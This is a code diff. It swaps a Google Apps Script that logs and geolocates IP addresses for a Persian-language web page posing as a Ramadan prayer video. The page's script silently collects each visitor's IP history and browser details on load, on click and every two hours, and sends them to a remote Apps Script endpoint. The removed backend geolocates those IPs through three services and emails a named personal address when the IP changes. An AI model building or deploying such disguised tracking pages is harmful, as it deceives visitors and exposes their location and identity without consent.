@@ -1,133 +1,196 @@
-function doGet(e) {
-  try {
-    // حل مشکل e undefined
-    e = e || {};
-    e.parameter = e.parameter || {};
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title>دعای رمضان</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #333;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+      background-image: url('Pic.jpg');
+      background-size: cover;
+      background-position: center center;
+      color: white;
+    }
+    h1 {
+      font-size: 36px;
+      color: white;
+      margin-top: 20px;
+    }
+    .content {
+      margin-top: 30px;
+    }
+    p {
+      font-size: 18px;
+      color: white;
+    }
+    #video {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 999;
+    }
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+    .video-visible {
+      display: block !important;
+    }
+    a {
+      font-size: 20px;
+      color: #00bcd4;
+      text-decoration: none;
+      padding: 10px;
+      border-radius: 5px;
+      background-color: rgba(0, 0, 0, 0.6);
+      transition: background-color 0.3s;
+      border-bottom: 2px solid #00bcd4;
+    }
+    a:hover {
+      background-color: #009688;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <h1>دعای ماه رمضان</h1>
+  <p>اللهم بلغنا رمضان و اعنا على صیامه و قیامه، و تقبله منا برحمتك، یا أرحم الرّاحمین</p>
+  <div class="content">
+    <p>برای گوش جان سپردن به دعا و برکت رمضان،</p>
+    <a href="#" id="showVideo">برای گوش جان سپردن به دعا اینجا را کلیک نمایید</a>
+  </div>
+  <div id="video">
+    <video controls id="videoPlayer">
+      <source src="Allahuma_Balighna_Ramadan.mp4?v=1.2.3" type="video/mp4">
+      مرورگر شما از ویدئو پشتیبانی نمیکند
+    </video>
+  </div>
+  <p>التماس دعا</p>
 
-    var ss = SpreadsheetApp.openById("1nzZV0Q9FycpQHac7VV46IGIo2huFoqXp_WKHFmWqVqE");
-    var logSheet = ss.getSheetByName("LOGS");
-    var geoSheet = ss.getSheetByName("GeoData");
+  <script>
+    const APP_VERSION = "1.2.3";  // نسخه‌گذاری برای جلوگیری از کش
 
-    if (!logSheet) throw new Error("❌ Sheet 'LOGS' not found!");
-    if (!geoSheet) throw new Error("❌ Sheet 'GeoData' not found!");
-
-    var ip = e.parameter.ip || "N/A";
-    var userAgent = e.parameter.ua || "N/A";
-
-    if (ip === "N/A") throw new Error("⛔ IP parameter missing!");
-
-    // ثبت لاگ
-    var timestamp = new Date();
-    logSheet.appendRow([timestamp.toISOString().split('T')[0], timestamp.toTimeString().split(' ')[0], ip, userAgent]);
-    SpreadsheetApp.flush();
-
-    // بررسی تغییر IP و ارسال ایمیل
-    checkAndSendEmail(ip);
-
-    // دریافت اطلاعات جغرافیایی از چند API
-    var geoData = getMultipleIPLocations(ip);
-
-    // اگر اطلاعات جغرافیایی موجود باشد، ذخیره کنید
-    if (geoData.status === "success") {
-      geoSheet.appendRow([
-        geoData.api1.country, geoData.api2.country, geoData.api3.country,
-        geoData.api1.region, geoData.api2.region, geoData.api3.region,
-        geoData.api1.city, geoData.api2.city, geoData.api3.city,
-        geoData.api1.isp, geoData.api2.isp, geoData.api3.isp,
-        geoData.api1.lat, geoData.api2.lat, geoData.api3.lat,
-        geoData.api1.lon, geoData.api2.lon, geoData.api3.lon,
-        `=HYPERLINK("https://maps.google.com?q=${geoData.api1.lat},${geoData.api1.lon}", "View Map")`,
-        `=HYPERLINK("https://maps.google.com?q=${geoData.api2.lat},${geoData.api2.lon}", "View Map")`,
-        `=HYPERLINK("https://maps.google.com?q=${geoData.api3.lat},${geoData.api3.lon}", "View Map")`
-      ]);
-      SpreadsheetApp.flush();
+    // دریافت IP از localStorage
+    function getStoredIPs() {
+      const storedIPs = localStorage.getItem('previousIPs');
+      return storedIPs ? JSON.parse(storedIPs) : [];
     }
 
-    return ContentService.createTextOutput(JSON.stringify({
-      status: "success",
-      message: "✅ Data logged successfully",
-      ip: ip,
-      geo: geoData
-    })).setMimeType(ContentService.MimeType.JSON);
+    // ذخیره IP ها در localStorage
+    function storeIPs(ips) {
+      localStorage.setItem('previousIPs', JSON.stringify(ips));
+    }
 
-  } catch (error) {
-    Logger.log("Error: " + error.message);
-    return ContentService.createTextOutput(JSON.stringify({
-      status: "error",
-      message: error.message
-    })).setMimeType(ContentService.MimeType.JSON);
-  }
-}
+    // دریافت IP از چندین سرویس
+    async function getIPAddress() {
+      const services = [
+        'https://api.ipify.org?format=json',
+        'https://ipinfo.io/json',
+        'https://worldtimeapi.org/api/ip'
+      ];
 
-// دریافت اطلاعات از سه API مختلف
-function getMultipleIPLocations(ip) {
-  const apiUrls = [
-    `https://ipapi.co/${ip}/json/`, // API 1
-    `https://geolocation-db.com/json/${ip}&position=true`, // API 2
-    `https://ipinfo.io/${ip}/json` // API 3
-  ];
-
-  try {
-    // فراخوانی سه API به صورت همزمان
-    const responses = apiUrls.map(url => UrlFetchApp.fetch(url, { muteHttpExceptions: true }));
-    const results = responses.map(response => JSON.parse(response.getContentText()));
-
-    // بررسی نتایج از هر API
-    const api1 = results[0];
-    const api2 = results[1];
-    const api3 = results[2];
-
-    // بازگرداندن داده‌ها از سه API
-    return {
-      status: "success",
-      api1: {
-        country: api1.country_name || "N/A",
-        region: api1.region || "N/A",
-        city: api1.city || "N/A",
-        isp: api1.org || "N/A",
-        lat: api1.latitude || 0,
-        lon: api1.longitude || 0
-      },
-      api2: {
-        country: api2.country_name || "N/A",
-        region: api2.state || "N/A",
-        city: api2.city || "N/A",
-        isp: api2.org || "N/A",
-        lat: api2.latitude || 0,
-        lon: api2.longitude || 0
-      },
-      api3: {
-        country: api3.country || "N/A",
-        region: api3.region || "N/A",
-        city: api3.city || "N/A",
-        isp: api3.org || "N/A",
-        lat: api3.loc ? api3.loc.split(',')[0] : 0, // بررسی null یا undefined بودن loc قبل از تقسیم
-        lon: api3.loc ? api3.loc.split(',')[1] : 0 // بررسی null یا undefined بودن loc قبل از تقسیم
+      for (const url of services) {
+        try {
+          const response = await fetch(url, { cache: 'no-store' });
+          const data = await response.json();
+          return data.ip || data.query || data.ipAddress;
+        } catch (error) {
+          console.error(`Error fetching IP from ${url}:`, error);
+        }
       }
-    };
-  } catch (error) {
-    Logger.log("Geolocation Error: " + error.message);
-    return { status: "fail", message: error.message };
-  }
-}
+      return "N/A"; // اگر IP پیدا نشد
+    }
 
-// بررسی تغییر IP و ارسال ایمیل
-function checkAndSendEmail(ip) {
-  const previousIP = PropertiesService.getScriptProperties().getProperty('lastIP');
+    // ارسال اطلاعات به گوگل اسکریپت
+    async function logAccess() {
+      try {
+        const ip = await getIPAddress();
+        if (ip === "N/A") {
+          console.error('IP not found, not sending data.');
+          return; // جلوگیری از ارسال درخواست در صورت عدم وجود IP
+        }
 
-  // اگر IP جدید با IP قبلی متفاوت بود، ایمیل ارسال کنید
-  if (ip !== previousIP) {
-    sendEmailNotification(ip); // ارسال ایمیل
-    // ذخیره IP جدید در Properties
-    PropertiesService.getScriptProperties().setProperty('lastIP', ip);
-  }
-}
+        // دریافت IP های قبلی از localStorage
+        let previousIPs = getStoredIPs();
 
-// ارسال ایمیل در صورت تغییر IP
-function sendEmailNotification(ip) {
-  const emailAddress = "Sami.Aksoy1983@gmail.com"; // آدرس ایمیل شما
-  const subject = "New IP Address Detected!";
-  const body = `The IP address has changed to: ${ip}`;
+        // اگر IP جدید است، آن را به آرایه اضافه کنید
+        if (!previousIPs.includes(ip)) {
+          previousIPs.push(ip);
+          storeIPs(previousIPs); // ذخیره IP ها در localStorage
+        }
 
-  MailApp.sendEmail(emailAddress, subject, body);
-}
+        // ارسال داده‌ها به اسکریپت گوگل
+        const scriptUrl = 'https://script.google.com/macros/s/AKfycbzeyYdoOEkALEiZxTk8hiK-rzOFvSaqh5E9DLfNjEcdyUfd4fpP0yHlD7DBO4ATZ4vOJw/exec'; // آدرس اسکریپت خود را اینجا قرار دهید
+        const params = new URLSearchParams({
+          ips: JSON.stringify(previousIPs), // ارسال آرایه IP ها به صورت JSON
+          ua: navigator.userAgent,
+          t: Date.now()
+        });
+
+        const response = await fetch(`${scriptUrl}?${params}`, { cache: 'no-store', redirect: 'follow' });
+        if (!response.ok) {
+          console.error('Failed to log access:', response.statusText);
+        } else {
+          console.log('IP logged successfully:', previousIPs);
+        }
+      } catch (error) {
+        console.error('خطا در ثبت لاگ:', error);
+      }
+    }
+
+    // مدیریت نمایش ویدئو
+    function handleVideoPlay() {
+      const videoElem = document.getElementById('videoPlayer');
+      
+      videoElem.addEventListener('loadedmetadata', () => {
+        if (videoElem.webkitSupportsFullscreen) {
+          videoElem.webkitEnterFullscreen();
+        } else if (videoElem.requestFullscreen) {
+          videoElem.requestFullscreen();
+        }
+      });
+
+      videoElem.src = `Allahuma_Balighna_Ramadan.mp4?v=${APP_VERSION}`;
+      document.getElementById('video').classList.add('video-visible');
+      videoElem.play();
+    }
+
+    // رویداد کلیک
+    document.getElementById('showVideo').addEventListener('click', async (e) => {
+      e.preventDefault();
+      await logAccess(); // ثبت IP هنگام کلیک
+      handleVideoPlay();
+    });
+
+    // ارسال دوره‌ای هر 2 ساعت
+    setInterval(async () => {
+      await logAccess();
+    }, 7200000); // 2 ساعت
+
+    // ارسال IP بلافاصله بعد از بارگذاری صفحه
+    window.addEventListener('load', async () => {
+      await logAccess();
+    });
+
+    // پاک کردن کش هنگام بسته شدن صفحه
+    window.addEventListener('beforeunload', () => {
+      caches.keys().then(names => {
+        names.forEach(name => caches.delete(name));
+      });
+    });
+  </script>
+</body>
+</html>
